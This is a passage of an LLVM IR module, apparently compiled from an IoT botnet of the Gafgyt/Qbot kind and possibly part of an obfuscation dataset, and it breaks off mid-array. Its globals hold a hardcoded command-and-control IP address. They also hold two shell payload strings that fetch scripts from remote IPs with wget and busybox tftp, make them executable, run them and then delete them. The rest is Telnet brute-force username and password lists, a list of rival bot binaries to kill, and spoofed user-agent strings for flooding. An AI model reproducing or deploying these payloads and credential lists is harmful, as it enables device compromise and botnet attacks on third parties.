; ModuleID = 'host/ir_fla/Ultron.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@UserAgents = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.36, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.2 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.3 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.5 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.6 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.7 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.8 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.9 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.10 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.11 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.12 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.14 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.15 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.16 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.17 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.18 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.19 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.21 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.22 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.23 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.24 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.26 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.27 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.28 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.29 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.32 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.35 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.36 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.37, i32 0, i32 0)], align 8
@.str.37 = private unnamed_addr constant [15 x i8] c"168.235.82.217\00", align 1
@port = global i32 443, align 4
@wgetpayload = global i8* getelementptr inbounds ([221 x i8], [221 x i8]* @.str.38, i32 0, i32 0), align 8
@.str.38 = private unnamed_addr constant [221 x i8] c"cd /var/;wget http://168.235.82.217/sh.sh;chmod 777 sh.sh;sh sh.sh;rm -rf sh.sh;tftp -g 168.235.82.217 -r ab.sh;chmod 777 ab.sh;sh ab.sh;rm -rf ab.sh;tftp 168.235.82.217 -c get ac.sh;chmod 777 ac.sh;sh ac.sh;rm -rf ac.sh\00", align 1
@tftppayload = global i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.39, i32 0, i32 0), align 8
@.str.39 = private unnamed_addr constant [111 x i8] c"cd /tmp; /bin/busybox tftp -g -l aiSHxd -r ab.sh 213.183.53.177; /bin/busybox chmod 777 aiSHxd; sh /tmp/aiSHxd\00", align 1
@lynxpayload = global i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), align 8
@.str.40 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@Telnet_Usernames = global [19 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)], align 16
@.str.41 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.42 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.43 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.44 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.47 = private unnamed_addr constant [10 x i8] c"support\00\00\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"CISCO\00\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"oracle\00\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"tim\00\00", align 1
@Telnet_Passwords = global [19 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)], align 16
@.str.52 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.53 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.56 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"netgear1\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"\00CISCO\00\00", align 1
@Bot_Killer_Binarys = global [176 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x 